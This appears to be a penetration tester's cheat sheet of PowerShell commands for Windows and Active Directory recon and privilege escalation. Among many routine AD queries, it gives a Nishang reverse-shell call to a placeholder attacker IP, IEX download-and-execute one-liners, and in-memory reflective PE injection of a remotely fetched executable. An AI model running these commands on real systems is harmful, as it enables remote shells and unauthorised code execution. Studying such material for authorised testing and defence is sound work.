# PowerShell

Some useful PowerShell commands that you can use during your recon or privsec phases.


## Execute block as an other user

```powershell
$pass = ConvertTo-SecureString '<password>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("<dom>\<username>", $pass)
Invoke-Command -Computer <computer_name> -Credential $cred -ScriptBlock { cmd.exe "/c <cmd>" }
```


## Download and execute script

The repository [Nishang](https://github.com/samratashok/nishang) contains a good
PowerShell script to create a [reverse shell](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1).
You need to add the following line at the end:

```powershell
Invoke-PowerShellTcp -Reverse -IPAddress <ip> -Port <port>
```

On your local machine:

- Create an HTTP server to serve the script: `python -m http.serve`
- Listen for an incoming [connection with nc](reverse-shell.md#listen-with-netcat).

On the remote host, execute the following PowerShell script:

```powershell
IEX(New-Object System.Net.WebClient).DownloadString('http://<ip>:<port>/<script_name.ps1>')
```


## ReflectivePEInjection

Start an executable from memory:

```powershell
IEX (New-Object System.Net.WebClient).DownloadString("https://security-tips.vincd.com/assets/Invoke-ReflectivePEInjection.ps1")
$ExeBytes = IWR "http://<ip>:<port>/x.exe" | Select-Object -ExpandProperty Content
Invoke-ReflectivePEInjection -PEBytes $ExeBytes
```


## Execute C# DLL from Powershell

```powershell
# Load a dll to Powershell
[Reflection.Assembly]::LoadFile("C:\Path\MyNamespace.Service.dll")
[Reflection.Assembly]::LoadFile("C:\Path\MyNamespace.Cryptography.dll")

# Call a public public static method
[MyNamespace.Service.Config]::ApplicationKey()

# Instantiate a class and class a method
$c = New-Object MyNamespace.Cryptography.MyCryptography
$c.Decrypt("CIPHER_TEXT", [MyNamespace.Service.Config]::ApplicationKey())
```

## ActiveDirectory Module without RSAT

To use the [ActiveDirectory Module](https://docs.microsoft.com/en-us/powershell/module/addsadministration/?view=win10-ps
) you only need to import the dll `Microsoft.ActiveDirectory.Management.dll`.
It located in the following folder on a system where [RAST](https://docs.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/remote-server-administration-tools) is installed :

```
C:\Windows\Microsoft.NET\assembly\GAC_64\Microsoft.ActiveDirectory.Management\
```

On the distant machine, you copy this dll then import it in Powershell:

```powershell
Import-Module .\Microsoft.ActiveDirectory.Management.dll
```

## Domain commands


### Collect AD users information

Here is snippets of Powershell commands to interact with AD LDAP. You can also
use customize filters to get vulnerable users ([SPN](./windows.md#list-spn-accounts), ...)

```powershell
# Helping functions
function Get-ADUserDirectoryEntry($user) {
    return (New-Object System.DirectoryServices.DirectorySearcher("(&(objectCategory=User)(samAccountName=$user))")).FindOne().GetDirectoryEntry()
}

function Get-ADUserGroups($user) {
    $userDirectoryEntry = Get-ADUserDirectoryEntry($user)
    $groups = $userDirectoryEntry.memberOf

    return $groups
}

function Get-ADGroupMembers($GroupName) {
    if ($GroupName -like "CN=*") {
        $GroupDistinguishedName = $GroupName
    } else {
        # find the distinguished name from the group name
        $GroupDistinguishedName = (New-Object System.DirectoryServices.DirectorySearcher("(&(objectCategory=Group)(cn=$GroupName))")).FindOne().GetDirectoryEntry().distinguishedName
    }

    # limited to the first 10k entries
    $GroupMembers = (New-Object System.DirectoryServices.DirectorySearcher("(&(objectCategory=User)(memberOf=$GroupDistinguishedName ))")).FindAll()

    return $GroupMembers.properties
}

function Get-ADComputerByOS($operatingSystem) {
    # https://ldapwiki.com/wiki/Active%20Directory%20Computer%20Related%20LDAP%20Query
    return (New-Object System.DirectoryServices.DirectorySearcher("(&(&(&(samAccountType=805306369)(objectCategory=computer)(operatingSystem=$operatingSystem*))))")).FindAll()
}

# Get "Domain admins" users, be carefull the name may change depending on the DC lang
$DomainAdmins = Get-ADGroupMembers("Domain Admins")
foreach($user in $DomainAdmins) { echo "$($user.displayname) ($($user.samaccountname))" }
```


### Get Domain Password Policy

```powershell
$policy = Get-ADDefaultDomainPasswordPolicy -Credential $cred -Server $domain
```


### Get user owner

```powershell
Get-ADUser $USERNAME | ForEach-Object {Get-ACL "AD:\$($_.DistinguishedName)" | Select-Object -ExpandProperty Owner}
```


### List deleted users

```powershell
$deletedObjectsDom = get-addomain | select DeletedObjectsContainer
$objects = Get-ADObject -SearchBase $deletedObjectsDom.DeletedObjectsContainer -ldapfilter "(objectClass=user)" -IncludeDeletedObjects -properties *
foreach ($object in $objects) { $object }
```


## Miscellaneous commands

### List TCP listening connections

The [`Get-NetTCPConnection`](https://docs.microsoft.com/en-us/powershell/module/nettcpip/get-nettcpconnection?view=win10-ps)
cmdlets lists TCP connections. By default the processes pid is return, so the
following command line select the process name instead.

```powershell
Get-NetTCPConnection -State Listen | Select local*, remote*, state, @{Name="Process";Expression={(Get-Process -Id $_.OwningProcess).ProcessName}} | Format-Table -AutoSize
```


### List Email aliases

```powershell
$ (Get-ADUser -Identity <user_ad_id> -Properties proxyAddresses).proxyAddresses
```


### Get PowerShell command history

```powershell
cd "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline"
gc ConsoleHost_history.txt
```


### Convert DACL

```powershell
$acl = get-acl HKLM:\System\CurrentControlSet\Services
ConvertFrom-SddlString -Sddl $acl -type RegistryRights | { Foreach-Object { $.DiscretionaryAcl } }
```


### Set Password Remotely

This [script](./assets/Set-PasswordRemotely.ps1) change the password of a user
on a remote forest.

```powershell
Set-PasswordRemotely {USERNAME} {DOMAIN}
```

### List Certificates

```powershell
$NamingContext = "DC=corpo,DC=lan"

$directoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Configuration,$NamingContext")
$adSearcher = New-Object System.DirectoryServices.DirectorySearcher($directoryEntry, "(distinguishedName=CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,$NamingContext)")
$NTAuthCertificates = $adSearcher.FindOne()
$cacertificates = $NTAuthCertificates.Properties.cacertificate

Foreach ($rawByte in $cacertificates) {
    $cacertificate = [System.Security.Cryptography.X509Certificates.X509Certificate2]$rawByte

    $subjectName = [System.Text.Encoding]::Default.GetString($cacertificate.SubjectName.RawData)
    $issuerName = [System.Text.Encoding]::Default.GetString($cacertificate.IssuerName.RawData)
    $signatureAlgorithm = $cacertificate.SignatureAlgorithm.FriendlyName
}
```


### List inactive computers

```powershell
$computers = (New-Object System.DirectoryServices.DirectorySearcher("(&(&(samAccountType=805306369)(objectCategory=computer)))")).FindAll()

$inactiveDays = 180
$limit = (Get-Date).AddDays(-1 * $inactiveDays)
$path = "C:\Temp\Inactive_Computers_$($inactiveDays)days.csv"

foreach($computer in $computers) {
    $c = $computer
    $lastlogontimestamp = [datetime]::FromFileTime($c.Properties.lastlogontimestamp[0])
    $pwdlastset = [datetime]::FromFileTime($c.Properties.pwdlastset[0])

    if ($lastlogontimestamp -lt $limit) {
        Add-Content $path "$($c.Properties.name),$($pwdlastset),$($lastlogontimestamp),$($c.Properties.operatingsystem)"
    }
}
```

### List GPO

The following script use the `DirectorySearcher` module to search for all the GPO
on the current domain. The cmdlet [`Get-GPO`](https://docs.microsoft.com/en-us/powershell/module/grouppolicy/get-gpo?view=win10-ps) could also be used.

```powershell
# https://gallery.technet.microsoft.com/scriptcenter/Get-GroupPolicyObject-05aaef2d

$GPOSearcher = New-Object DirectoryServices.DirectorySearcher -Property @{
    Filter = '(objectClass=groupPolicyContainer)'
    PageSize = 100
}
$GPOSearcher.FindAll() | ForEach-Object {
    New-Object -TypeName PSCustomObject -Property @{
        'DisplayName' = $_.properties.displayname -join ''
        'DistinguishedName' = $_.properties.distinguishedname -join ''
        'CommonName' = $_.properties.cn -join ''
        'FilePath' = $_.properties.gpcfilesyspath -join ''
    } | Select-Object -Property DisplayName,CommonName,FilePath,DistinguishedName
}
```

To get the permissions on a GPO, you can use the cmdlet [`Get-GPPermission`](https://docs.microsoft.com/en-us/powershell/module/grouppolicy/get-gppermission?view=win10-ps):

```powershell
Get-GPPermission -Name "GPO_NAME" -All
```
